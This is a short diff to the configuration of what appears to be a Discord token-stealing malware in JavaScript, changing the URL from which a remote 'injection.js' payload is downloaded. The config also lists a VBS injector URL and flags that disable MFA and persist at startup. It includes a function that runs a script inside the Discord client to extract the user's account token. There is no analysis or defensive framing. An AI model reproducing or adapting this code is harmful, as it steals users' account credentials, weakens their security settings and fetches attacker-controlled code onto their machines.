@@ -38,7 +38,7 @@ const CONFIG = {
     auto_persist_startup: '%false',
     auto_mfa_disabler: 'true',
     auto_email_update: 'false',
-    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
+    injection_url: 'https://raw.githubusercontent.com/allahsanaheyecan/banadahuzurversin/refs/heads/main/injection.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
